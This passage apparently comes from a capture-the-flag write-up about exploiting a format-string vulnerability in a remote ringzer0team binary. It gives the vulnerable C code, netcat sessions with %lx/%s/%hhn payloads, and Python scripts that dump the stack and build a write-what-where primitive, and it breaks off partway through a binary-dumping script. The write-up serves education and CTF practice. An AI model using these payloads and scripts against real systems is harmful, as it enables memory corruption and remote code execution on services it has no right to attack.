<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">response</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="n">strncpy</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">cleanBuffer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&quot;Here&#39;s your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">cleanBuffer</span><span class="p">);</span> <span class="c1">// &lt;-- we have a format string vulnerability here</span>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&quot;%s is a wrong password.</span><span class="se">\n\n</span><span class="s">Password:&quot;</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%lx-%lx-%lx-%lx-%lx-%lx-
</span><span class='line'>17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="http://barrebas.github.io/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="n">addr</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">700</span><span class="p">):</span>
</span><span class='line'>  <span class="n">grab</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span><span class='line'><span class="mi">633</span> <span class="mi">7</span><span class="n">fffeecd9c28</span>
</span><span class='line'><span class="mi">634</span> <span class="mi">1</span><span class="n">c</span>
</span><span class='line'><span class="mi">635</span> <span class="mi">2</span>
</span><span class='line'><span class="mi">636</span> <span class="mi">7</span><span class="n">fff00000042</span>
</span><span class='line'><span class="mi">637</span> <span class="mi">7</span><span class="n">fffeecdaf65</span>
</span><span class='line'><span class="mi">638</span> <span class="mi">0</span>
</span><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$lx</span>
</span><span class='line'>7fff3ca49f51 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>/home/crackme/fs_64 is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$lx</span>
</span><span class='line'>7fff3ca49f51 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>/home/crackme/fs_64 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%66c%636<span class="nv">$hhn</span>
</span><span class='line'>                                                                 � is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>Bhome/crackme/fs_64 is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this will write out &#39;BAS&#39;,0 to the scratch area!</span>
</span><span class='line'><span class="c"># update the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="c"># write a byte to the scratch area</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="p">))</span>
</span><span class='line'><span class="c"># update the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="c"># write a byte to the scratch area</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;S&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'><span class="c"># write out a NULL byte first writing out 256 bytes (which wraps to 0x00)</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># reset the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># CAN ADDRESS IT DIRECTLY!!</span>
</span><span class='line'><span class="n">scratch_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">scratch_addr</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5<span class="nv">$ </span>python sploit1.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f51
</span><span class='line'>scratch contains:  0x534142
</span><span class='line'>scratch is parameter 1601
</span><span class='line'>scratch contains:  0x53414200
</span></code></pre></td></tr></table></div></figure>


<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
